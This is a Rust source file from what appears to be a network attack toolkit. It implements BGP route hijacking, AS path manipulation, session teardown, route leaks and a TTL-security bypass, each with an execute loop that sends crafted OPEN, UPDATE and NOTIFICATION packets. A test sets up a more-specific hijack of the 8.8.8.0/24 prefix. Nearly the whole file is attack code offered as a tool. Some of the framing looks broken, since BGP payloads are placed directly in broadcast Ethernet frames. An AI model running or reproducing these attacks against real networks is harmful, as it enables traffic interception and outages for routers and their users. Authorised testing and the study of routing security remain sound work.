//! BGP Attack Implementations

use super::packet::{
    BgpNotificationMessage, BgpOpenMessage, BgpOrigin, BgpPacket, BgpPathAttribute,
    BgpUpdateMessage,
};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// BGP Route Hijacking Attack
///
/// Advertises unauthorized prefixes to hijack traffic destined for those
/// networks. This is one of the most dangerous attacks on the Internet,
/// allowing complete traffic interception.
#[derive(Debug, Clone)]
pub struct BgpRouteHijackAttack {
    /// Attacker's AS number
    pub attacker_as: u32,
    /// Attacker's BGP router ID
    pub router_id: Ipv4Addr,
    /// Next hop for hijacked routes
    pub next_hop: Ipv4Addr,
    /// Prefixes to hijack (network, prefix_len)
    pub hijacked_prefixes: Vec<(Ipv4Addr, u8)>,
    /// Hijack mode
    pub mode: RouteHijackMode,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RouteHijackMode {
    /// Announce exact prefix (complete hijack)
    ExactPrefix,
    /// Announce more specific prefix (partial hijack)
    MoreSpecific,
    /// Announce less specific prefix (broader hijack)
    LessSpecific,
}

impl BgpRouteHijackAttack {
    pub fn new(attacker_as: u32, router_id: Ipv4Addr, next_hop: Ipv4Addr) -> Self {
        Self {
            attacker_as,
            router_id,
            next_hop,
            hijacked_prefixes: vec![],
            mode: RouteHijackMode::ExactPrefix,
        }
    }

    pub fn add_prefix(mut self, network: Ipv4Addr, prefix_len: u8) -> Self {
        self.hijacked_prefixes.push((network, prefix_len));
        self
    }

    pub fn set_mode(mut self, mode: RouteHijackMode) -> Self {
        self.mode = mode;
        self
    }

    /// Adjust prefix length based on hijack mode
    fn get_adjusted_prefix(&self, network: Ipv4Addr, prefix_len: u8) -> (Ipv4Addr, u8) {
        match self.mode {
            RouteHijackMode::ExactPrefix => (network, prefix_len),
            RouteHijackMode::MoreSpecific => {
                // More specific = longer prefix (e.g., /24 -> /25)
                let new_len = std::cmp::min(prefix_len + 1, 32);
                (network, new_len)
            }
            RouteHijackMode::LessSpecific => {
                // Less specific = shorter prefix (e.g., /24 -> /23)
                let new_len = prefix_len.saturating_sub(1);
                (network, new_len)
            }
        }
    }

    /// Build OPEN message
    pub fn build_open(&self) -> BgpPacket {
        let open = BgpOpenMessage::new(self.attacker_as as u16, self.router_id);
        BgpPacket::open(open)
    }

    /// Build UPDATE message with hijacked routes
    pub fn build_hijack_update(&self) -> BgpPacket {
        let mut update = BgpUpdateMessage::new();

        // Add path attributes
        update = update
            .add_attribute(BgpPathAttribute::origin(BgpOrigin::Igp))
            .add_attribute(BgpPathAttribute::as4_path(vec![self.attacker_as]))
            .add_attribute(BgpPathAttribute::next_hop(self.next_hop));

        // Add hijacked prefixes
        for (network, prefix_len) in &self.hijacked_prefixes {
            let (adj_network, adj_len) = self.get_adjusted_prefix(*network, *prefix_len);
            update = update.with_nlri(adj_network, adj_len);
        }

        BgpPacket::update(update)
    }

    /// Build KEEPALIVE
    pub fn build_keepalive(&self) -> BgpPacket {
        BgpPacket::keepalive()
    }
}

/// BGP AS Path Manipulation Attack
///
/// Manipulates the AS_PATH attribute to make routes appear more or less
/// attractive, or to bypass filters and policies.
#[derive(Debug, Clone)]
pub struct BgpAsPathManipulationAttack {
    /// Attacker's AS number
    pub attacker_as: u32,
    /// Router ID
    pub router_id: Ipv4Addr,
    /// Next hop
    pub next_hop: Ipv4Addr,
    /// Prefixes to advertise
    pub prefixes: Vec<(Ipv4Addr, u8)>,
    /// Manipulation mode
    pub mode: AsPathManipulationMode,
    /// Custom AS path (for injection mode)
    pub custom_as_path: Vec<u32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AsPathManipulationMode {
    /// Prepend own AS multiple times (make less attractive)
    Prepending,
    /// Empty AS path (make most attractive - dangerous!)
    EmptyPath,
    /// Inject fake AS path
    CustomPath,
    /// AS path poisoning (add target AS to prevent acceptance)
    Poisoning,
}

impl BgpAsPathManipulationAttack {
    pub fn new(attacker_as: u32, router_id: Ipv4Addr, next_hop: Ipv4Addr) -> Self {
        Self {
            attacker_as,
            router_id,
            next_hop,
            prefixes: vec![],
            mode: AsPathManipulationMode::Prepending,
            custom_as_path: vec![],
        }
    }

    pub fn add_prefix(mut self, network: Ipv4Addr, prefix_len: u8) -> Self {
        self.prefixes.push((network, prefix_len));
        self
    }

    pub fn set_mode(mut self, mode: AsPathManipulationMode) -> Self {
        self.mode = mode;
        self
    }

    pub fn with_custom_path(mut self, as_path: Vec<u32>) -> Self {
        self.custom_as_path = as_path;
        self.mode = AsPathManipulationMode::CustomPath;
        self
    }

    /// Build AS path based on mode
    fn build_as_path(&self) -> Vec<u32> {
        match self.mode {
            AsPathManipulationMode::Prepending => {
                // Prepend own AS 10 times
                vec![self.attacker_as; 10]
            }
            AsPathManipulationMode::EmptyPath => {
                // Empty AS path (dangerous - route appears to originate here)
                vec![]
            }
            AsPathManipulationMode::CustomPath => self.custom_as_path.clone(),
            AsPathManipulationMode::Poisoning => {
                // Add a bunch of random ASes to poison the path
                vec![
                    self.attacker_as,
                    64512, // Reserved ASN
                    64513,
                    64514,
                    64515,
                ]
            }
        }
    }

    pub fn build_open(&self) -> BgpPacket {
        let open = BgpOpenMessage::new(self.attacker_as as u16, self.router_id);
        BgpPacket::open(open)
    }

    pub fn build_update(&self) -> BgpPacket {
        let mut update = BgpUpdateMessage::new();

        let as_path = self.build_as_path();

        // Add attributes
        update = update
            .add_attribute(BgpPathAttribute::origin(BgpOrigin::Igp))
            .add_attribute(BgpPathAttribute::next_hop(self.next_hop));

        if !as_path.is_empty() {
            update = update.add_attribute(BgpPathAttribute::as4_path(as_path));
        }

        // Add prefixes
        for (network, prefix_len) in &self.prefixes {
            update = update.with_nlri(*network, *prefix_len);
        }

        BgpPacket::update(update)
    }
}

/// BGP Session Hijacking Attack
///
/// Attempts to hijack an existing BGP session by spoofing packets with
/// correct sequence numbers or exploiting weak MD5 authentication.
#[derive(Debug, Clone)]
pub struct BgpSessionHijackAttack {
    /// Target router IP
    pub target_router: Ipv4Addr,
    /// Target AS number
    pub target_as: u32,
    /// Spoofed source IP (legitimate peer)
    pub spoofed_peer_ip: Ipv4Addr,
    /// Spoofed peer AS
    pub spoofed_peer_as: u32,
    /// Attack mode
    pub mode: SessionHijackMode,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SessionHijackMode {
    /// Send NOTIFICATION to tear down session
    Teardown,
    /// Inject malicious UPDATEs
    RouteInjection,
    /// Reset session with spoofed packets
    Reset,
}

impl BgpSessionHijackAttack {
    pub fn new(
        target_router: Ipv4Addr,
        target_as: u32,
        spoofed_peer_ip: Ipv4Addr,
        spoofed_peer_as: u32,
    ) -> Self {
        Self {
            target_router,
            target_as,
            spoofed_peer_ip,
            spoofed_peer_as,
            mode: SessionHijackMode::Teardown,
        }
    }

    pub fn set_mode(mut self, mode: SessionHijackMode) -> Self {
        self.mode = mode;
        self
    }

    /// Build NOTIFICATION to tear down session
    pub fn build_teardown(&self) -> BgpPacket {
        let notif = BgpNotificationMessage::new(6, 0); // Cease, unspecified
        BgpPacket::notification(notif)
    }

    /// Build malicious UPDATE
    pub fn build_malicious_update(&self, prefix: Ipv4Addr, prefix_len: u8) -> BgpPacket {
        let mut update = BgpUpdateMessage::new();

        update = update
            .with_nlri(prefix, prefix_len)
            .add_attribute(BgpPathAttribute::origin(BgpOrigin::Igp))
            .add_attribute(BgpPathAttribute::as4_path(vec![self.spoofed_peer_as]))
            .add_attribute(BgpPathAttribute::next_hop(self.spoofed_peer_ip));

        BgpPacket::update(update)
    }
}

/// BGP Route Leak Attack
///
/// Simulates route leaks where routes are improperly exported between peers,
/// customers, and providers, causing traffic misdirection.
#[derive(Debug, Clone)]
pub struct BgpRouteLeakAttack {
    /// Attacker AS
    pub attacker_as: u32,
    /// Router ID
    pub router_id: Ipv4Addr,
    /// Next hop
    pub next_hop: Ipv4Addr,
    /// Routes to leak (that should not be exported)
    pub leaked_routes: Vec<(Ipv4Addr, u8, Vec<u32>)>, // (prefix, len, original_as_path)
    /// Leak type
    pub leak_type: RouteLeakType,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RouteLeakType {
    /// Leak customer routes to another customer
    CustomerToCustomer,
    /// Leak provider routes to another provider
    ProviderToProvider,
    /// Leak peer routes to provider (valley-free violation)
    PeerToProvider,
}

impl BgpRouteLeakAttack {
    pub fn new(attacker_as: u32, router_id: Ipv4Addr, next_hop: Ipv4Addr) -> Self {
        Self {
            attacker_as,
            router_id,
            next_hop,
            leaked_routes: vec![],
            leak_type: RouteLeakType::ProviderToProvider,
        }
    }

    pub fn add_leaked_route(
        mut self,
        prefix: Ipv4Addr,
        prefix_len: u8,
        original_as_path: Vec<u32>,
    ) -> Self {
        self.leaked_routes
            .push((prefix, prefix_len, original_as_path));
        self
    }

    pub fn set_leak_type(mut self, leak_type: RouteLeakType) -> Self {
        self.leak_type = leak_type;
        self
    }

    pub fn build_open(&self) -> BgpPacket {
        let open = BgpOpenMessage::new(self.attacker_as as u16, self.router_id);
        BgpPacket::open(open)
    }

    pub fn build_leak_update(&self) -> BgpPacket {
        let mut update = BgpUpdateMessage::new();

        for (prefix, prefix_len, original_as_path) in &self.leaked_routes {
            // Prepend attacker AS to leaked path
            let mut leaked_path = vec![self.attacker_as];
            leaked_path.extend(original_as_path);

            update = update
                .with_nlri(*prefix, *prefix_len)
                .add_attribute(BgpPathAttribute::origin(BgpOrigin::Igp))
                .add_attribute(BgpPathAttribute::as4_path(leaked_path.clone()))
                .add_attribute(BgpPathAttribute::next_hop(self.next_hop));
        }

        BgpPacket::update(update)
    }
}

/// BGP TTL Security Bypass Attack
///
/// Attempts to bypass GTSM (Generalized TTL Security Mechanism) by
/// manipulating TTL values to appear as directly connected peer.
#[derive(Debug, Clone)]
pub struct BgpTtlSecurityBypassAttack {
    /// Attacker AS
    pub attacker_as: u32,
    /// Router ID
    pub router_id: Ipv4Addr,
    /// TTL value to use (255 for GTSM)
    pub ttl: u8,
    /// Target peer
    pub target_peer: Ipv4Addr,
}

impl BgpTtlSecurityBypassAttack {
    pub fn new(attacker_as: u32, router_id: Ipv4Addr, target_peer: Ipv4Addr) -> Self {
        Self {
            attacker_as,
            router_id,
            ttl: 255, // GTSM expects TTL=255
            target_peer,
        }
    }

    pub fn with_ttl(mut self, ttl: u8) -> Self {
        self.ttl = ttl;
        self
    }

    /// Build OPEN with GTSM-compliant TTL
    pub fn build_open(&self) -> BgpPacket {
        let open = BgpOpenMessage::new(self.attacker_as as u16, self.router_id).with_hold_time(180);
        BgpPacket::open(open)
    }

    /// Build KEEPALIVE
    pub fn build_keepalive(&self) -> BgpPacket {
        BgpPacket::keepalive()
    }

    /// Build UPDATE with spoofed TTL
    pub fn build_update(&self, prefix: Ipv4Addr, prefix_len: u8, next_hop: Ipv4Addr) -> BgpPacket {
        let mut update = BgpUpdateMessage::new();

        update = update
            .with_nlri(prefix, prefix_len)
            .add_attribute(BgpPathAttribute::origin(BgpOrigin::Igp))
            .add_attribute(BgpPathAttribute::as4_path(vec![self.attacker_as]))
            .add_attribute(BgpPathAttribute::next_hop(next_hop));

        BgpPacket::update(update)
    }
}

#[async_trait]
impl Attack for BgpRouteHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Phase 1: Send OPEN
        let open_bytes = self.build_open().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            open_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        time::sleep(Duration::from_secs(1)).await;

        // Phase 2: Send UPDATE with hijacked routes
        let update_bytes = self.build_hijack_update().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            update_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        // Phase 3: Send periodic KEEPALIVEs
        let interval = Duration::from_secs(30);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let keepalive_bytes = self.build_keepalive().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                keepalive_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BGP Route Hijacking"
    }
}

#[async_trait]
#[async_trait]
impl Attack for BgpAsPathManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send OPEN
        let open_bytes = self.build_open().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            open_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        time::sleep(Duration::from_secs(1)).await;

        // Send UPDATE with manipulated AS path
        let update_bytes = self.build_update().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            update_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        // Periodic KEEPALIVEs
        let interval = Duration::from_secs(30);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let keepalive_bytes = BgpPacket::keepalive().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                keepalive_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BGP AS Path Manipulation"
    }
}

#[async_trait]
#[async_trait]
impl Attack for BgpSessionHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let bgp_bytes = self.build_teardown().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                bgp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BGP Session Hijacking"
    }
}

#[async_trait]
#[async_trait]
impl Attack for BgpRouteLeakAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send OPEN
        let open_bytes = self.build_open().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            open_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        time::sleep(Duration::from_secs(1)).await;

        // Send leaked routes UPDATE
        let update_bytes = self.build_leak_update().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            update_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        // Periodic KEEPALIVEs
        let interval = Duration::from_secs(30);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let keepalive_bytes = BgpPacket::keepalive().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                keepalive_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BGP Route Leak"
    }
}

#[async_trait]
#[async_trait]
impl Attack for BgpTtlSecurityBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send OPEN
        let open_bytes = self.build_open().to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            open_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        time::sleep(Duration::from_secs(1)).await;

        // Send UPDATE
        let update_bytes = self
            .build_update("0.0.0.0".parse().unwrap(), 0, self.router_id)
            .to_bytes();
        let frame = EthernetFrame::new(
            MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
            MacAddress(ctx.interface.mac_address.0),
            EtherType::IPv4,
            update_bytes,
        );
        let _ = ctx.interface.send_raw(&frame.to_bytes());
        ctx.stats.increment_packets_sent();

        // Periodic KEEPALIVEs
        let interval = Duration::from_secs(30);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let keepalive_bytes = self.build_keepalive().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                keepalive_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BGP TTL Security Bypass"
    }
}
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_route_hijack_attack() {
        let attack = BgpRouteHijackAttack::new(
            65001,
            "10.0.0.1".parse().unwrap(),
            "10.0.0.1".parse().unwrap(),
        )
        .add_prefix("8.8.8.0".parse().unwrap(), 24)
        .set_mode(RouteHijackMode::MoreSpecific);

        let update = attack.build_hijack_update();
        assert!(!update.payload.is_empty());
    }

    #[test]
    fn test_as_path_manipulation() {
        let attack = BgpAsPathManipulationAttack::new(
            65001,
            "10.0.0.1".parse().unwrap(),
            "10.0.0.1".parse().unwrap(),
        )
        .add_prefix("192.168.0.0".parse().unwrap(), 16)
        .set_mode(AsPathManipulationMode::EmptyPath);

        let update = attack.build_update();
        assert!(!update.payload.is_empty());
    }

    #[test]
    fn test_session_hijack() {
        let attack = BgpSessionHijackAttack::new(
            "10.0.0.2".parse().unwrap(),
            65002,
            "10.0.0.1".parse().unwrap(),
            65001,
        );

        let teardown = attack.build_teardown();
        assert_eq!(
            teardown.message_type,
            super::super::packet::BgpMessageType::Notification
        );
    }
}
